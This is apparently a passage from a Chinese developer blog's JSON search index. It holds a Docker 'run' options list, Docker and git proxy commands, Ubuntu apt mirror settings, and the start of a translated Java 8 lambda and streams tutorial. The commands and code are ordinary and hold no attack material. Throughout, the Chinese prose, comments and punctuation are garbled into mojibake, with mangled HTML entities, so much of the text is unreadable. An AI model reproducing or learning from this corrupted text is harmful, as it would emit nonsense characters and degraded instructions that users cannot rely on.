hostâ€™s cgroup namespace â€˜privateâ€™: Run the container in its own private cgroup namespace â€˜â€™: Use the cgroup namespace as configured by the default-cgroupns-mode option on the daemon (default)--cidfileWrite the container ID to the file--cpu-countCPU count (Windows only)--cpu-percentCPU percent (Windows only)--cpu-periodLimit CPU CFS (Completely Fair Scheduler) period--cpu-quotaLimit CPU CFS (Completely Fair Scheduler) quota--cpu-rt-periodAPI 1.25+ Limit CPU real-time period in microseconds--cpu-rt-runtimeAPI 1.25+ Limit CPU real-time runtime in microseconds--cpu-shares , -cCPU shares (relative weight)--cpusAPI 1.25+ Number of CPUs--cpuset-cpusCPUs in which to allow execution (0-3, 0,1)--cpuset-memsMEMs in which to allow execution (0-3, 0,1)--detach , -dRun container in background and print container ID--detach-keysOverride the key sequence for detaching a container--deviceAdd a host device to the container--device-cgroup-ruleAdd a rule to the cgroup allowed devices list--device-read-bpsLimit read rate (bytes per second) from a device--device-read-iopsLimit read rate (IO per second) from a device--device-write-bpsLimit write rate (bytes per second) to a device--device-write-iopsLimit write rate (IO per second) to a device--disable-content-trusttrueSkip image verification--dnsSet custom DNS servers--dns-optSet DNS options--dns-optionSet DNS options--dns-searchSet custom DNS search domains--domainnameContainer NIS domain name--entrypointOverwrite the default ENTRYPOINT of the image--env , -eSet environment variables--env-fileRead in a file of environment variables--exposeExpose a port or a range of ports--gpusAPI 1.40+ GPU devices to add to the container (â€˜allâ€™ to pass all GPUs)--group-addAdd additional groups to join--health-cmdCommand to run to check health--health-intervalTime between running the check (ms|s|m|h) (default 0s)--health-retriesConsecutive failures needed to report unhealthy--health-start-periodAPI 1.29+ Start period for the container to initialize before starting health-retries countdown (ms|s|m|h) (default 0s)--health-timeoutMaximum time to allow one check to run (ms|s|m|h) (default 0s)--helpPrint usage--hostname , -hContainer host name--initAPI 1.25+ Run an init inside the container that forwards signals and reaps processes--interactive , -iKeep STDIN open even if not attached--io-maxbandwidthMaximum IO bandwidth limit for the system drive (Windows only)--io-maxiopsMaximum IOps limit for the system drive (Windows only)--ipIPv4 address (e.g., 172.30.100.104)--ip6IPv6 address (e.g., 2001:db8::33)--ipcIPC mode to use--isolationContainer isolation technology--kernel-memoryKernel memory limit--label , -lSet meta data on a container--label-fileRead in a line delimited file of labels--linkAdd link to another container--link-local-ipContainer IPv4/IPv6 link-local addresses--log-driverLogging driver for the container--log-optLog driver options--mac-addressContainer MAC address (e.g., 92:d0:c6:0a:29:33)--memory , -mMemory limit--memory-reservationMemory soft limit--memory-swapSwap limit equal to memory plus swap: â€˜-1â€™ to enable unlimited swap--memory-swappiness-1Tune container memory swappiness (0 to 100)--mountAttach a filesystem mount to the container--nameAssign a name to the container--netConnect a container to a network--net-aliasAdd network-scoped alias for the container--networkConnect a container to a network--network-aliasAdd network-scoped alias for the container--no-healthcheckDisable any container-specified HEALTHCHECK--oom-kill-disableDisable OOM Killer--oom-score-adjTune hostâ€™s OOM preferences (-1000 to 1000)--pidPID namespace to use--pids-limitTune container pids limit (set -1 for unlimited)--platformAPI 1.32+ Set platform if server is multi-platform capable--privilegedGive extended privileges to this container--publish , -pPublish a containerâ€™s port(s) to the host--publish-all , -PPublish all exposed ports to random ports--pullmissingPull image before running (â€œalwaysâ€|â€œmissingâ€|â€œneverâ€)--read-onlyMount the containerâ€™s root filesystem as read only--restartnoRestart policy to apply when a container exits--rmAutomatically remove the container when it exits--runtimeRuntime to use for this container--security-optSecurity Options--shm-sizeSize of /dev/shm--sig-proxytrueProxy received signals to the process--stop-signalSIGTERMSignal to stop a container--stop-timeoutAPI 1.25+ Timeout (in seconds) to stop a container--storage-optStorage driver options for the container--sysctlSysctl options--tmpfsMount a tmpfs directory--tty , -tAllocate a pseudo-TTY--ulimitUlimit options--user , -uUsername or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])--usernsUser namespace to use--utsUTS namespace to use--volume , -vBind mount a volume--volume-driverOptional volume driver for the container--volumes-fromMount volumes from the specified container(s)--workdir , -wWorking directory inside the container # å¯åŠ¨å®¹å™¨ $ docker exec -it XXID /bin/bash #åˆ›é€ å®¹å™¨ $ docker run -dit -p 8080:80 -v /e/windowssrc:å®¹å™¨é‡Œæ˜ å°„è·¯å¾„ --name èµ·ä¸ªåå­— ubuntu:ä½ çš„é•œåƒtagï¼ˆé»˜è®¤æ˜¯latestï¼‰ #åˆ›é€ å®¹å™¨å¹¶è¿è¡Œå¤šä¸ªå‘½ä»¤ $ docker run -dit XXX(images) /bin/bash -c \"ls &amp;&amp; pwd\" #åˆ é™¤å®¹å™¨ $ docker rm -f XXID #æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨å‘½ä»¤å¦‚ä¸‹ï¼š $ docker ps -a å®¹å™¨æ‰“åŒ…å¹¶åšæˆé•œåƒ å®¹å™¨æ‰“åŒ… $ docker commit containerId dockerUserName/XXX æ³¨ï¼šcontainerIdä¸ºä½ éœ€è¦ä¸Šä¼ çš„å®¹å™¨idï¼ŒdockerUserNameä¸ºdockerHubçš„ç™»å½•åï¼Œxxxä¸ºä»“åº“å,å½“ç„¶ä¹Ÿä¸ä¸€å®šéå¾—æ˜¯dockerUserName/xxxï¼Œåªæ˜¯ä¸ºäº†æ–¹ä¾¿èµ·è§ æ¥ä¸‹æ¥ä¸ºå­˜åœ¨äºæœ¬åœ°çš„é•œåƒæ‰“æ ‡ç­¾ $ docker tag imageName dockerUserName/xxx[:tag] #æ³¨ï¼šimageNameä¸ºä½ éœ€è¦ä¸Šä¼ çš„é•œåƒnameï¼Œ # dockerUserNameä¸ºdockerHubçš„ç™»å½•åï¼Œxxxä¸ºä»“åº“åï¼Œå¿…é¡»å’Œä½ åœ¨dockerhubä¸­æ–°å»ºçš„ä»“åº“åç›¸åŒï¼Œtagä¸æŒ‡å®šå°±æ˜¯latest æ‰“åŒ…å¥½ä¹‹åï¼Œå°±æŠŠæ‰“åŒ…å¥½çš„é•œåƒä¸Šä¼  $ docker push dockerUserName/xxx[:tag] æ³¨ï¼štagä¸æŒ‡å®šå°±æ˜¯latest â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” gitè®¾ç½®ã€æŸ¥çœ‹ã€å–æ¶ˆä»£ç† è®¾ç½®ä»£ç†ï¼š $ git config --global http.proxy 'socks5://127.0.0.1:1080' $ git config --global https.proxy 'socks5://127.0.0.1:1080' æŸ¥çœ‹ä»£ç†ï¼š $ git config --global --get http.proxy $ git config --global --get https.proxy å–æ¶ˆä»£ç†ï¼š $ git config --global --unset http.proxygit config --global --unset https.proxy æ¢æº é’ˆå¯¹dockerå®¹å™¨çš„ä»£ç†é…ç½®ï¼š åœ¨åˆ›å»º(run)å®¹å™¨çš„æ—¶å€™ï¼ŒåŠ ä¸Š --net=host è¿™ä¸ªé€‰é¡¹ï¼Œå°±å¯ä»¥å®ç°å®¹å™¨å†…å¤–å…±äº«ç½‘ç»œï¼Œç„¶åå†åœ¨å®¹å™¨å†…éƒ¨é…ç½®gitï¼Œå°±å¯ä»¥å®ç°å®¹å™¨å†…ä»£ç†äº† Ubuntuç³»ç»Ÿä¸­ï¼Œè½¯ä»¶æºæ–‡ä»¶åœ°å€ä¸ºï¼š/etc/apt/sources.list 1.å¤‡ä»½åŸæ¥çš„æºï¼Œå°†ä»¥å‰çš„æºå¤‡ä»½ä¸€ä¸‹ï¼Œä»¥é˜²ä»¥åå¯ä»¥ç”¨çš„ã€‚ $ sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list.bak 2.æ‰“å¼€/etc/apt/sources.listæ–‡ä»¶ï¼Œåœ¨å‰é¢æ·»åŠ å¦‚ä¸‹æ¡ç›®ï¼Œå¹¶ä¿å­˜ã€‚ $ sudo vim /etc/apt/sources.listï¼ˆå¯å°†vimæ›´æ¢ä¸ºè‡ªå·±ç†Ÿæ‚‰çš„ç¼–è¾‘å™¨ï¼‰ æ·»åŠ æº #æ·»åŠ é˜¿é‡Œæº deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse #æ·»åŠ æ¸…åæº deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse 3.æ›´æ–° æ›´æ–°æº $ sudo apt-get update å¦‚å‡ºç°ä¾èµ–é—®é¢˜ï¼Œè§£å†³æ–¹å¼å¦‚ä¸‹ï¼š $ sudo apt-get -f install æ›´æ–°è½¯ä»¶ï¼š $sudo apt-get upgrade ä¿®æ”¹/etc/profile æ‰“åŒ…åä¸ç”Ÿæ•ˆå¾—é—®é¢˜ è§£å†³åŠæ³•: å¯ä»¥å°†ç¯å¢ƒå˜é‡æ”¾åˆ° /root/.bashrc è¿™ä¸ªé‡Œé¢ docker å®¹å™¨ä¸­ é»˜è®¤ç”¨æˆ·ä¸º root, å°†ç¯å¢ƒå˜é‡æ”¾åˆ° ./bashrc ä¸­","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ•™ç¨‹","slug":"æ•™ç¨‹","permalink":"https://www.sizaif.com/tags/%E6%95%99%E7%A8%8B/"},{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"}],"author":"sizaif"},{"title":"Java 8 Tutorial æ•™ç¨‹","slug":"Java-8-Tutorial-æ•™ç¨‹","date":"2021-08-09T16:00:00.000Z","updated":"2021-09-19T10:14:49.368Z","comments":true,"path":"posts/c65d65/","link":"","permalink":"https://www.sizaif.com/posts/c65d65/","excerpt":"","text":"Java 8 Tutorial æ•™ç¨‹ ğŸ˜„ @Auther sizaif ğŸ“† 2021-05-29 20:41:05 ğŸ”— ç¿»è¯‘è‡ª https://winterbe.com/posts/2014/03/16/java-8-tutorial/ [TOC] è¯´æ˜ æ¬¢è¿æ¥åˆ°æˆ‘å¯¹Java 8çš„ä»‹ç»ã€‚æœ¬æ•™ç¨‹å°†é€æ­¥æŒ‡å¯¼æ‚¨äº†è§£æ‰€æœ‰æ–°çš„è¯­è¨€ç‰¹æ€§ã€‚åœ¨ç®€çŸ­ç®€å•çš„ä»£ç ç¤ºä¾‹çš„æ”¯æŒä¸‹ï¼Œæ‚¨å°†å­¦ä¹ å¦‚ä½•ä½¿ç”¨é»˜è®¤æ¥å£æ–¹æ³•ã€lambdaè¡¨è¾¾å¼ã€æ–¹æ³•å¼•ç”¨å’Œå¯é‡å¤æ³¨é‡Šã€‚åœ¨æœ¬æ–‡çš„æœ€åï¼Œæ‚¨å°†ç†Ÿæ‚‰æœ€æ–°çš„APIå˜åŒ–ï¼Œå¦‚æµã€åŠŸèƒ½æ¥å£ã€åœ°å›¾æ‰©å±•å’Œæ–°çš„æ—¥æœŸAPIã€‚ æ¥å£ç¼ºçœæ–¹æ³• Java 8å…è®¸æˆ‘ä»¬åˆ©ç”¨defaultå…³é”®å­—å‘æ¥å£æ·»åŠ éæŠ½è±¡çš„æ–¹æ³•å®ç°ã€‚ æ­¤ç‰¹æ€§ä¹Ÿç§°ä¸ºæ‰©å±•æ–¹æ³•( Extension Methods.)ã€‚è¿™æ˜¯ç¬¬ä¸€ä¸ªä¾‹å­: interface Formula &#123; double calculate(int a); default double sqrt(int a) &#123; return Math.sqrt(a); &#125; &#125; é™¤äº†æŠ½è±¡æ–¹æ³•calculateæ¥å£å¤–ï¼ŒFormulaè¿˜å®šä¹‰äº†é»˜è®¤æ–¹æ³•sqrtã€‚å…·ä½“ç±»åªéœ€å®ç°æŠ½è±¡æ–¹æ³•calculate é»˜è®¤æ–¹æ³•sqrtå¯ä»¥å¼€ç®±å³ç”¨ã€‚ Formula formula = new Formula() &#123; @Override public double calculate(int a) &#123; return sqrt(a * 100); &#125; &#125;; formula.calculate(100); // 100.0 formula.sqrt(16); // 4.0 è¯¥å…¬å¼ä»¥åŒ¿åå¯¹è±¡çš„å½¢å¼å®ç°ã€‚è¿™æ®µä»£ç ç›¸å½“å†—é•¿:6è¡Œä»£ç å°±å¯ä»¥å®Œæˆè¿™æ ·ä¸€ä¸ªç®€å•çš„sqrt(a * 100)è®¡ç®—ã€‚æ­£å¦‚æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚ä¸­çœ‹åˆ°çš„ï¼Œåœ¨Java 8ä¸­æœ‰ä¸€ç§æ›´å¥½çš„å®ç°å•ä¸ªæ–¹æ³•å¯¹è±¡çš„æ–¹æ³•ã€‚ æ‹‰å§†è¾¾(Lambda)è¡¨è¾¾å¼ è®©æˆ‘ä»¬ä»ä¸€ä¸ªç®€å•çš„ä¾‹å­å¼€å§‹ï¼Œåœ¨ä»¥å‰çš„Javaç‰ˆæœ¬ä¸­å¦‚ä½•å¯¹å­—ç¬¦ä¸²åˆ—è¡¨æ’åº: List&lt;String> names = Arrays.asList(\"peter\", \"anna\", \"mike\", \"xenia\"); Collections.sort(names, new Comparator&lt;String>() &#123; @Override public int compare(String a, String b) &#123; return b.compareTo(a); &#125; &#125;); é™æ€å®ç”¨æ–¹æ³•Collections.sortæ¥å—ä¸€ä¸ªåˆ—è¡¨å’Œä¸€ä¸ªæ¯”è¾ƒå™¨ï¼Œä»¥ä¾¿å¯¹ç»™å®šåˆ—è¡¨çš„å…ƒç´ è¿›è¡Œæ’åº. æ‚¨ç»å¸¸ä¼šå‘ç°è‡ªå·±åˆ›å»ºäº†åŒ¿åæ¯”è¾ƒå™¨å¹¶å°†å®ƒä»¬ä¼ é€’ç»™sortæ–¹æ³•ã€‚ Java 8çš„è¯­æ³•è¦çŸ­å¾—å¤šï¼Œè€Œä¸æ˜¯æ•´å¤©åˆ›å»ºåŒ¿åå¯¹è±¡ï¼Œ lambda expressions: Collections.sort(names, (String a, String b) -> &#123; return b.compareTo(a); &#125;); æ­£å¦‚æ‚¨æ‰€çœ‹åˆ°çš„ï¼Œä»£ç æ›´çŸ­ï¼Œæ›´å®¹æ˜“é˜…è¯»ã€‚ä½†å®ƒå˜å¾—æ›´çŸ­: Collections.sort(names, (String a, String b) -> b.compareTo(a)); å¯¹äºä¸€è¡Œæ–¹æ³•ä¸»ä½“ï¼Œå¯ä»¥è·³è¿‡å¤§æ‹¬å·{}å’Œreturnå…³é”®å­—ã€‚ä½†å®ƒå˜å¾—æ›´çŸ­: Collections.sort(names, (a, b) -> b.compareTo(a)); javaç¼–è¯‘å™¨çŸ¥é“å‚æ•°ç±»å‹ï¼Œæ‰€ä»¥æ‚¨ä¹Ÿå¯ä»¥è·³è¿‡å®ƒä»¬ã€‚è®©æˆ‘ä»¬æ›´æ·±å…¥åœ°äº†è§£lambdaè¡¨è¾¾å¼åœ¨å®é™…ä¸­æ˜¯å¦‚ä½•ä½¿ç”¨çš„ å‡½æ•°å¼æ¥å£ lambdaè¡¨è¾¾å¼å¦‚ä½•é€‚åº”javaç±»å‹ç³»ç»Ÿ?æ¯ä¸ªlambdaå¯¹åº”äºç”±æ¥å£æŒ‡å®šçš„ç»™å®šç±»å‹.ä¸€ä¸ªæ‰€è°“çš„å‡½æ•°æ¥å£å¿…é¡»åŒ…å«ä¸€ä¸ªæŠ½è±¡æ–¹æ³•å£°æ˜ã€‚ è¯¥ç±»å‹çš„æ¯ä¸ªlambdaè¡¨è¾¾å¼éƒ½å°†ä¸è¿™ä¸ªæŠ½è±¡æ–¹æ³•åŒ¹é…ã€‚ç”±äºé»˜è®¤æ–¹æ³•ä¸æ˜¯æŠ½è±¡çš„ï¼Œæ‚¨å¯ä»¥è‡ªç”±åœ°å°†é»˜è®¤æ–¹æ³•æ·»åŠ åˆ°å‡½æ•°æ¥å£ä¸­ã€‚ åªè¦æ¥å£åªåŒ…å«ä¸€ä¸ªæŠ½è±¡æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†ä»»æ„æ¥å£ä½œä¸ºlambdaè¡¨è¾¾å¼ä½¿ç”¨ã€‚ä¸ºäº†ç¡®ä¿æ‚¨çš„æ¥å£æ»¡è¶³éœ€æ±‚ï¼Œæ‚¨åº”è¯¥æ·»åŠ @FunctionalInterfaceæ³¨é‡Šã€‚ç¼–è¯‘å™¨çŸ¥é“è¿™ä¸ªæ³¨é‡Šï¼Œå½“æ‚¨è¯•å›¾å‘æ¥å£æ·»åŠ ç¬¬äºŒä¸ªæŠ½è±¡æ–¹æ³•å£°æ˜æ—¶ï¼Œå°±ä¼šæŠ›å‡ºç¼–è¯‘å™¨é”™è¯¯ã€‚ Example: @FunctionalInterface interface Converter&lt;F, T> &#123; T convert(F from); &#125; Converter&lt;String, Integer> converter = (from) -> Integer.valueOf(from); Integer converted = converter.convert(\"123\"); System.out.println(converted); // 123 è¯·è®°ä½ï¼Œå¦‚æœ@FunctionalInterfaceæ³¨é‡Šè¢«çœç•¥ï¼Œé‚£ä¹ˆä»£ç ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚ æ–¹æ³•å’Œæ„é€ å‡½æ•°å¼•ç”¨ é€šè¿‡ä½¿ç”¨é™æ€æ–¹æ³•å¼•ç”¨ï¼Œå¯ä»¥è¿›ä¸€æ­¥ç®€åŒ–ä¸Šé¢çš„ç¤ºä¾‹ä»£ç : Converter&lt;String, Integer> converter = Integer::valueOf; Integer converted = converter.convert(\"123\"); System.out.println(converted); // 123 Java 8å…è®¸æ‚¨é€šè¿‡::å…³é”®å­—ä¼ é€’æ–¹æ³•æˆ–æ„é€ å‡½æ•°çš„å¼•ç”¨ã€‚ä¸Šé¢çš„ä¾‹å­å±•ç¤ºäº†å¦‚ä½•å¼•ç”¨é™æ€æ–¹æ³•ã€‚ä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥å¼•ç”¨å¯¹è±¡æ–¹æ³•: class Something &#123; String startsWith(String s) &#123; return String.valueOf(s.charAt(0)); &#125;&#125; Something something = new Something();Converter&lt;String, String> converter = something::startsWith;String converted = converter.convert(\"Java\");System.out.println(converted); // \"J\" è®©æˆ‘ä»¬çœ‹çœ‹::å…³é”®å­—å¦‚ä½•åœ¨æ„é€ å‡½æ•°ä¸­å·¥ä½œã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå¸¦æœ‰ä¸åŒæ„é€ å‡½æ•°çš„ç¤ºä¾‹bean: class Person &#123; String firstName; String lastName; Person() &#123;&#125; Person(String firstName, String lastName) &#123; this.firstName = firstName; this.lastName = lastName; &#125;&#125; æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªç”¨äºåˆ›å»ºæ–°äººå‘˜çš„äººå‘˜å·¥å‚æ¥å£: interface PersonFactory&lt;P extends Person> &#123; P create(String firstName, String lastName);&#125; æˆ‘ä»¬ä¸æ˜¯æ‰‹åŠ¨å®ç°å·¥å‚ï¼Œè€Œæ˜¯é€šè¿‡æ„é€ å‡½æ•°å¼•ç”¨å°†æ‰€æœ‰ä¸œè¥¿ç²˜åœ¨ä¸€èµ·: PersonFactory&lt;Person> personFactory = Person::new;Person person = personFactory.create(\"Peter\", \"Parker\"); é€šè¿‡Person::newåˆ›å»ºå¯¹Personæ„é€ å‡½æ•°çš„å¼•ç”¨ã€‚Javaç¼–è¯‘å™¨é€šè¿‡åŒ¹é…PersonFactory.createçš„ç­¾åè‡ªåŠ¨é€‰æ‹©æ­£ç¡®çš„æ„é€ å‡½æ•°ã€‚ LambdaèŒƒå›´ ä»lambdaè¡¨è¾¾å¼è®¿é—®å¤–éƒ¨ä½œç”¨åŸŸå˜é‡éå¸¸ç±»ä¼¼äºåŒ¿åå¯¹è±¡ã€‚æ‚¨å¯ä»¥ä»æœ¬åœ°å¤–éƒ¨ä½œç”¨åŸŸä»¥åŠå®ä¾‹å­—æ®µå’Œé™æ€å˜é‡è®¿é—®æœ€ç»ˆå˜é‡ã€‚ è®¿é—®å±€éƒ¨å˜é‡ æˆ‘ä»¬å¯ä»¥ä»lambdaè¡¨è¾¾å¼çš„å¤–éƒ¨ä½œç”¨åŸŸè¯»å–æœ€ç»ˆå±€éƒ¨å˜é‡: final int num = 1;Converter&lt;Integer, String> stringConverter = (from) -> String.valueOf(from + num);stringConverter.convert(2); // 3 ä½†ä¸åŒ¿åå¯¹è±¡ä¸åŒçš„æ˜¯ï¼Œå˜é‡numä¸å¿…å£°æ˜ä¸ºfinalã€‚æ­¤ä»£ç ä¹Ÿæ˜¯æœ‰æ•ˆçš„: int num = 1;Converter&lt;Integer, String> stringConverter = (from) -> String.valueOf(from + num);stringConverter.convert(2); // 3 ä½†æ˜¯numå¿…é¡»æ˜¯éšå¼çš„finalï¼Œæ‰èƒ½ç¼–è¯‘ä»£ç ã€‚ä»¥ä¸‹ä»£ç æ— æ³•ç¼–è¯‘: int num = 1;Converter&lt;Integer, String> stringConverter = (from) -> String.valueOf(from + num);num = 3; ä¹Ÿç¦æ­¢ä»lambdaè¡¨è¾¾å¼å†…å†™å…¥numã€‚ è®¿é—®å­—æ®µå’Œé™æ€å˜é‡ ä¸å±€éƒ¨å˜é‡ç›¸æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥ä»lambdaè¡¨è¾¾å¼ä¸­è¯»å†™å®ä¾‹å­—æ®µå’Œé™æ€å˜é‡ã€‚è¿™ç§è¡Œä¸ºåœ¨åŒ¿åå¯¹è±¡ä¸­å¾ˆå¸¸è§ã€‚ class Lambda4 &#123; static int outerStaticNum; int outerNum; void testScopes() &#123; Converter&lt;Integer, String> stringConverter1 = (from) -> &#123; outerNum = 23; return String.valueOf(from); &#125;; Converter&lt;Integer, String> stringConverter2 = (from) -> &#123; outerStaticNum = 72; return String.valueOf(from); &#125;; &#125;&#125; è®¿é—®ç¼ºçœæ¥å£æ–¹æ³• è¿˜è®°å¾—ç¬¬ä¸€éƒ¨åˆ†çš„å…¬å¼ä¾‹å­å—? æ¥å£Formulaå®šä¹‰äº†ä¸€ä¸ªé»˜è®¤æ–¹æ³•sqrtï¼Œå¯ä»¥ä»æ¯ä¸ªå…¬å¼å®ä¾‹(åŒ…æ‹¬åŒ¿åå¯¹è±¡)è®¿é—®è¯¥æ–¹æ³•ã€‚è¿™ä¸é€‚ç”¨äºlambdaè¡¨è¾¾å¼ã€‚ ä¸èƒ½ä»lambdaè¡¨è¾¾å¼ä¸­è®¿é—®é»˜è®¤æ–¹æ³•ã€‚ä»¥ä¸‹ä»£ç æ— æ³•ç¼–è¯‘: Formula formula = (a) -> sqrt( a * 100); å†…ç½®å‡½æ•°å¼æ¥å£ JDK 1.8 APIåŒ…å«è®¸å¤šå†…ç½®çš„åŠŸèƒ½æ€§æ¥å£ã€‚å®ƒä»¬ä¸­çš„ä¸€äº›åœ¨è¾ƒæ—©çš„Javaç‰ˆæœ¬ä¸­å¾ˆæœ‰åï¼Œæ¯”å¦‚Comparatoræˆ–Runnableã€‚é€šè¿‡@FunctionalInterfaceæ³¨é‡Šå¯¹è¿™äº›ç°æœ‰æ¥å£è¿›è¡Œäº†æ‰©å±•ï¼Œä»¥æ”¯æŒLambdaã€‚ ä½†æ˜¯Java 8 APIä¹Ÿå……æ»¡äº†æ–°çš„åŠŸèƒ½æ¥å£ï¼Œä½¿æ‚¨çš„ç”Ÿæ´»æ›´è½»æ¾ã€‚å…¶ä¸­ä¸€äº›æ–°æ¥å£æ¥è‡ª Google Guavaåº“ã€‚å³ä½¿æ‚¨ç†Ÿæ‚‰è¿™ä¸ªåº“ï¼Œä¹Ÿåº”è¯¥å¯†åˆ‡å…³æ³¨è¿™äº›æ¥å£æ˜¯å¦‚ä½•é€šè¿‡ä¸€äº›æœ‰ç”¨çš„æ–¹æ³•æ‰©å±•æ¥æ‰©å±•çš„ã€‚ è°“è¯(Predicates) è°“è¯æ˜¯ä¸€ä¸ªå‚æ•°çš„å¸ƒå°”å€¼å‡½æ•°ã€‚è¯¥æ¥å£åŒ…å«ç”¨äºå°†è°“è¯ç»„åˆæˆå¤æ‚é€»è¾‘æœ¯è¯­(å’Œæˆ–å¦å®š)çš„å„ç§é»˜è®¤æ–¹æ³•ã€‚ Predicate&lt;String> predicate = (s) -> s.length() > 0;predicate.test(\"foo\"); // truepredicate.negate().test(\"foo\"); // falsePredicate&lt;Boolean> nonNull = Objects::nonNull;Predicate&lt;Boolean> isNull = Objects::isNull;Predicate&lt;String> isEmpty = String::isEmpty;Predicate&lt;String> isNotEmpty = isEmpty.negate(); å‡½æ•°(Functions) å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°å¹¶äº§ç”Ÿä¸€ä¸ªç»“æœã€‚é»˜è®¤æ–¹æ³•å¯ä»¥ç”¨äºå°†å¤šä¸ªå‡½æ•°é“¾æ¥åœ¨ä¸€èµ·(compose, andThen)ã€‚ Function&lt;String, Integer> toInteger = Integer::valueOf;Function&lt;String, String> backToString = toInteger.andThen(String::valueOf);backToString.apply(\"123\"); // \"123\" suppliers Suppliersç”Ÿæˆç»™å®šæ³›å‹ç±»å‹çš„ç»“æœã€‚ä¸å‡½æ•°ä¸åŒï¼Œ,Suppliersä¸æ¥å—å‚æ•°ã€‚ Supplier&lt;Person> personSupplier = Person::new;personSupplier.get(); // new Person Consumers æ¶ˆè´¹è€…è¡¨ç¤ºå¯¹å•ä¸ªè¾“å…¥å‚æ•°æ‰§è¡Œçš„æ“ä½œ Consumer&lt;Person> greeter = (p) -> System.out.println(\"Hello, \" + p.firstName);greeter.accept(new Person(\"Luke\", \"Skywalker\")); comparators æ¯”è¾ƒå™¨åœ¨è¾ƒæ—©çš„Javaç‰ˆæœ¬ä¸­å¾ˆæœ‰åã€‚Java 8å‘æ¥å£ä¸­æ·»åŠ äº†å„ç§é»˜è®¤æ–¹æ³•ã€‚ Comparator&lt;Person> comparator = (p1, p2) -> p1.firstName.compareTo(p2.firstName);Person p1 = new Person(\"John\", \"Doe\");Person p2 = new Person(\"Alice\", \"Wonderland\");comparator.compare(p1, p2); // > 0comparator.reversed().compare(p1, p2); // &lt; 0 Optionals å¯é€‰å¯¹è±¡ä¸æ˜¯å‡½æ•°æ¥å£ï¼Œè€Œæ˜¯ä¸€ä¸ªé˜²æ­¢NullPointerExceptionçš„æ¼‚äº®å®ç”¨å·¥å…·ã€‚è¿™æ˜¯ä¸‹ä¸€èŠ‚çš„ä¸€ä¸ªé‡è¦æ¦‚å¿µï¼Œæ‰€ä»¥è®©æˆ‘ä»¬å¿«é€Ÿäº†è§£ä¸€ä¸‹optionalæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚ Optionalæ˜¯ä¸€ä¸ªç®€å•çš„å€¼å®¹å™¨ï¼Œå®ƒå¯ä»¥æ˜¯ç©ºå€¼æˆ–éç©ºå€¼ã€‚è€ƒè™‘ä¸€ä¸ªå¯èƒ½è¿”å›éç©ºç»“æœä½†æœ‰æ—¶ä»€ä¹ˆä¹Ÿä¸è¿”å›çš„æ–¹æ³•ã€‚åœ¨Java 8ä¸­ï¼Œä¸æ˜¯è¿”å›nullï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªOptionalã€‚ Optional&lt;String> optional = Optional.of(\"bam\");optional.isPresent(); // trueoptional.get(); // \"bam\"optional.orElse(\"fallback\"); // \"bam\"optional.ifPresent((s) -> System.out.println(s.charAt(0))); // \"b\" Streams streamè¡¨ç¤ºä¸€ä¸ªå¯ä»¥æ‰§è¡Œä¸€ä¸ªæˆ–å¤šä¸ªæ“ä½œçš„å…ƒç´ åºåˆ—ã€‚æµæ“ä½œå¯ä»¥æ˜¯ä¸­é—´æ“ä½œï¼Œä¹Ÿå¯ä»¥æ˜¯ç»ˆç«¯æ“ä½œã€‚ç»ˆç«¯æ“ä½œè¿”å›æŸç§ç±»å‹çš„ç»“æœï¼Œè€Œä¸­é—´æ“ä½œè¿”å›æµæœ¬èº«ï¼Œå› 